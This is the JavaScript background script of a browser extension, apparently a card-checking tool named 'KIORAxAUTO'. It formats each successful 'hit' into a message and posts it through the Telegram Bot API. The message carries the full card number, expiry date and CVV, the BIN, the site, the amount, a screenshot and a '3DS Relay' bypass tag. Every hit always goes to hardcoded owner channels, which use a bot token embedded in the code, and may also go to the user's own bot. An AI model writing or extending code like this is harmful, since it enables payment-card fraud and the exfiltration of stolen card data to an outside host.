(function () {
  // ── Owner bot (always receives every hit) ─────────────────────────────────
  var OWNER_TOKEN   = '8976432780:AAFxg0gysd2Tv7lONNx5CS7jnSmGzP0OtLY';
  var OWNER_TARGETS = ['-1003838099625', '-1003920379304'];  // group + channel

  // ── Storage keys ──────────────────────────────────────────────────────────
  var TOKEN_KEY    = 'Nerona_tg_bot_token';
  var CHAT_KEY     = 'Nerona_tg_user_id';
  var CHANNEL_KEY  = 'Nerona_tg_channel_id';
  var ENABLED_KEY  = 'Nerona_tg_forward_enabled';
  var STATUS_KEY   = 'Nerona_tg_last_status';
  var ERROR_KEY    = 'Nerona_tg_last_error';
  var TIME_KEY     = 'Nerona_tg_last_ts';
  var HISTORY_KEY  = 'Nerona_hit_history';

  // ── Helpers ───────────────────────────────────────────────────────────────

  function isToken(value) {
    return /^\d{6,}:[A-Za-z0-9_-]{20,}$/.test(String(value || '').trim());
  }

  function isChatId(value) {
    return /^(@[A-Za-z0-9_]{5,32}|-?\d{5,20})$/.test(String(value || '').trim());
  }

  function escapeHtml(value) {
    return String(value == null ? '' : value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function dataUrlToBlob(dataUrl) {
    try {
      var parts = String(dataUrl || '').split(',');
      if (parts.length < 2) return null;
      var mimeMatch = parts[0].match(/:(.*?);/);
      if (!mimeMatch) return null;
      var mime = mimeMatch[1];
      var bstr = atob(parts[1]);
      var n = bstr.length;
      var u8 = new Uint8Array(n);
      while (n--) u8[n] = bstr.charCodeAt(n);
      return new Blob([u8], { type: mime });
    } catch (e) { return null; }
  }

  function getBin(data) {
    if (data.bin) return String(data.bin).replace(/\D/g, '').slice(0, 6);
    var card = String(data.card || '').replace(/\D/g, '');
    return card.slice(0, 6);
  }

  function siteFromData(data) {
    if (data && data.site) return String(data.site);
    try {
      if (data && data.url) return new URL(data.url).hostname.replace(/^www\./, '');
    } catch (e) {}
    return 'unknown';
  }

  function siteUrlFromData(data) {
    if (data && data.url) return String(data.url);
    if (data && data.site) return data.site.startsWith('http') ? data.site : 'https://' + data.site;
    return '';
  }

  function amountFromData(data) {
    if (!data || data.amount == null || data.amount === '') return '';
    // amount arrives pre-formatted from inject.js as e.g. "$19.99" or "EUR 19.99"
    // Return it as-is so we don't lose the currency symbol or mangle the value
    if (typeof data.amount === 'number') return data.amount.toFixed(2);
    var str = String(data.amount).trim();
    // Reject placeholder zeros
    if (str === '0' || str === '$0' || str === '0.00' || str === '$0.00') return '';
    return str.slice(0, 30);
  }

  function currencyFromData(data) {
    if (data && data.currency) {
      var raw = String(data.currency).trim();
      if (/^[a-zA-Z]{3}$/.test(raw)) return raw.toUpperCase();
    }
    if (data && data.response) {
      var m = String(data.response).match(/\b(USD|EUR|GBP|CAD|AUD|INR|BRL|MXN|JPY|KRW|CHF|SGD|HKD|NOK|SEK|DKK|PLN|CZK|HUF|RON|TRY|ZAR|IDR|PHP|MYR|THB|VND|NGN|PKR|BDT|AED|SAR|QAR|KWD)\b/i);
      if (m) return m[1].toUpperCase();
    }
    return 'USD';
  }

  function buildCardLine(data) {
    var number = String(data.card || data.cardFull || '').replace(/[^0-9]/g, '');
    var exp    = String(data.exp || '').trim();
    var cvv    = String(data.cvv || data.cvc || '').trim();
    if (!number) return '';
    var parts = [number];
    if (exp) parts.push(exp);
    if (cvv) parts.push(cvv);
    return parts.join('|');
  }

  // ── Hit Counter ───────────────────────────────────────────────────────────
  // Returns { today: N, total: N } by reading Nerona_hit_history
  async function getHitCounts() {
    try {
      var data  = await chrome.storage.local.get([HISTORY_KEY]);
      var hits  = Array.isArray(data[HISTORY_KEY]) ? data[HISTORY_KEY] : [];
      var today = new Date().toISOString().split('T')[0]; // "2025-01-15"
      var todayCount = 0;
      for (var i = 0; i < hits.length; i++) {
        var h = hits[i];
        // date field is stored as "YYYY-MM-DD" by hit-recorder.js
        var hDate = h.date || (h.timestamp ? new Date(h.timestamp).toISOString().split('T')[0] : '');
        if (hDate === today) todayCount++;
      }
      return { today: todayCount, total: hits.length };
    } catch (e) {
      return { today: 0, total: 0 };
    }
  }

  // ── Message builder ───────────────────────────────────────────────────────
  function buildHitMessage(data, counts) {
    data   = data   || {};
    counts = counts || { today: 0, total: 0 };

    var cardLine  = buildCardLine(data);
    var bin       = getBin(data) || (cardLine ? String(cardLine).replace(/\D/g, '').slice(0, 6) : '');
    var amount    = amountFromData(data);
    var currency  = currencyFromData(data);
    var site      = siteFromData(data);
    var siteUrl   = siteUrlFromData(data);
    var status    = data.response || 'Approved';

    // Hit counter display — today count + all-time total
    var todayNum  = counts.today  || 1;
    var totalNum  = counts.total  || 1;
    var counterLine = '🎯 <b>Hit #' + todayNum + ' Today</b>  |  🏆 <b>All-Time: ' + totalNum + '</b>';

    var lines = [
      '✅ <b>HIT DETECTED — KIORAxAUTO</b>',
      counterLine,
      '',
      '🔖 <b>Status:</b>   <code>' + escapeHtml(status) + '</code>',
      '🌐 <b>Site:</b>     ' + (siteUrl
        ? '<a href="' + escapeHtml(siteUrl) + '">' + escapeHtml(site) + '</a>'
        : '<code>' + escapeHtml(site) + '</code>'),
    ];

    if (cardLine) lines.push('💳 <b>Card:</b>     <code>' + escapeHtml(cardLine) + '</code>');
    if (bin)      lines.push('🔢 <b>BIN:</b>      <code>' + escapeHtml(bin) + '</code>');

    if (amount) {
      // amount already includes the currency symbol (e.g. "$19.99") — display as-is
      lines.push('💰 <b>Amount:</b>   <code>' + escapeHtml(amount) + '</code>');
    }

    if (data.type === 'three_ds' || data.response === 'three_ds') {
      lines.push('🔐 <b>Bypass:</b>   <code>3DS Relay</code>');
    }

    lines.push('');
    lines.push('🕐 <b>Time:</b>     <code>' + escapeHtml(new Date().toLocaleString()) + '</code>');
    lines.push('🤖 <i>@StripeQuantumbot</i>');

    return lines.join('\n');
  }

  // ── Status helpers ────────────────────────────────────────────────────────

  async function saveStatus(status, error) {
    var update = {};
    update[STATUS_KEY] = status || '';
    update[ERROR_KEY]  = error  || '';
    update[TIME_KEY]   = new Date().toISOString();
    try { await chrome.storage.local.set(update); } catch (e) {}
  }

  // Returns user's custom bot settings, or null if not configured/disabled
  async function getUserSettings() {
    var data    = await chrome.storage.local.get([TOKEN_KEY, CHAT_KEY, CHANNEL_KEY, ENABLED_KEY]);
    var token   = String(data[TOKEN_KEY]   || '').trim();
    var chatId  = String(data[CHAT_KEY]    || '').trim();
    var chanId  = String(data[CHANNEL_KEY] || '').trim();
    var enabled = data[ENABLED_KEY] === true || data[ENABLED_KEY] === 'true';
    if (!enabled || !isToken(token)) return null;
    var targets = [chatId, chanId].filter(isChatId);
    if (targets.length === 0) return null;
    return { token: token, targets: targets };
  }

  // ── Low-level send helpers ────────────────────────────────────────────────

  async function sendText(token, chatId, text) {
    var response = await fetch(
      'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendMessage',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_web_page_preview: false,
        }),
      }
    );
    var body = await response.json().catch(function () { return {}; });
    if (!response.ok || body.ok === false) {
      throw new Error(body.description || 'Telegram HTTP ' + response.status);
    }
    return true;
  }

  async function sendPhoto(token, chatId, photoBlob, caption) {
    var formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', photoBlob, 'hit_screenshot.jpg');
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    var response = await fetch(
      'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendPhoto',
      { method: 'POST', body: formData }
    );
    var body = await response.json().catch(function () { return {}; });
    if (!response.ok || body.ok === false) {
      throw new Error(body.description || 'Telegram HTTP ' + response.status);
    }
    return true;
  }

  // Broadcast text (+ optional photo) to all targets of one bot
  async function broadcastToBot(token, targets, text, photoBlob) {
    var errors = [];
    for (var i = 0; i < targets.length; i++) {
      var dest = targets[i];
      try {
        if (photoBlob) {
          await sendPhoto(token, dest, photoBlob, text);
        } else {
          await sendText(token, dest, text);
        }
      } catch (e) {
        if (photoBlob) {
          try { await sendText(token, dest, text); } catch (e2) { errors.push(dest + ': ' + e2.message); }
        } else {
          errors.push(dest + ': ' + e.message);
        }
      }
    }
    return errors;
  }

  // Send to OWNER channels always, then to user's bot if configured
  async function deliverHit(text, photoBlob) {
    var allErrors = [];

    // 1. Always deliver to owner's group + channel
    var ownerErrors = await broadcastToBot(OWNER_TOKEN, OWNER_TARGETS, text, photoBlob);
    allErrors = allErrors.concat(ownerErrors);

    // 2. Also deliver to user's custom bot if configured
    try {
      var userSettings = await getUserSettings();
      if (userSettings) {
        if (userSettings.token !== OWNER_TOKEN) {
          // Different bot — send to all their targets
          var userErrors = await broadcastToBot(userSettings.token, userSettings.targets, text, photoBlob);
          allErrors = allErrors.concat(userErrors);
        } else {
          // Same bot token — only send to targets not already covered
          var extraTargets = userSettings.targets.filter(function (t) {
            return OWNER_TARGETS.indexOf(t) === -1;
          });
          if (extraTargets.length > 0) {
            var extraErrors = await broadcastToBot(userSettings.token, extraTargets, text, photoBlob);
            allErrors = allErrors.concat(extraErrors);
          }
        }
      }
    } catch (e) {
      allErrors.push('user-bot: ' + (e.message || String(e)));
    }

    return allErrors;
  }

  // ── Message Listeners ─────────────────────────────────────────────────────

  chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (!message || !message.type) return false;

    // ── Test ──────────────────────────────────────────────────────────────
    if (message.type === 'Nerona_TG_TEST') {
      (async function () {
        try {
          var counts = await getHitCounts();
          var testText = [
            '✅ <b>KIORAxAUTO Telegram Test</b>',
            '🎯 <b>Hits Today: ' + counts.today + '</b>  |  🏆 <b>All-Time: ' + counts.total + '</b>',
            '',
            'Your Telegram alerts are working correctly.',
            '🤖 <i>@StripeQuantumbot</i>',
          ].join('\n');

          var errors = await deliverHit(testText, null);
          if (errors.length === 0) {
            await saveStatus('ok', '');
            sendResponse({ ok: true });
          } else {
            await saveStatus('error', errors.join('; '));
            sendResponse({ ok: false, reason: errors.join('; ') });
          }
        } catch (e) {
          await saveStatus('error', e.message || String(e));
          sendResponse({ ok: false, reason: e.message || String(e) });
        }
      })();
      return true;
    }

    // ── Hit notification ─────────────────────────────────────────────────
    if (message.type === 'Nerona_RECORD_HIT') {
      (async function () {
        try {
          var hitData = message.data || {};

          // Read hit counts AFTER the hit has already been saved by hit-recorder.js
          // Small delay ensures the history is written before we count
          await new Promise(function (resolve) { setTimeout(resolve, 300); });
          var counts = await getHitCounts();

          var text      = buildHitMessage(hitData, counts);
          var photoBlob = null;
          var ss = hitData.screenshot || hitData.screenshotBase64;
          if (ss) photoBlob = dataUrlToBlob(ss);

          var errors = await deliverHit(text, photoBlob);
          if (errors.length > 0) {
            await saveStatus('error', errors.join('; '));
          } else {
            await saveStatus('ok', '');
          }
        } catch (e) {
          await saveStatus('error', e.message || String(e));
        }
      })();
      return false;
    }

    return false;
  });
})();
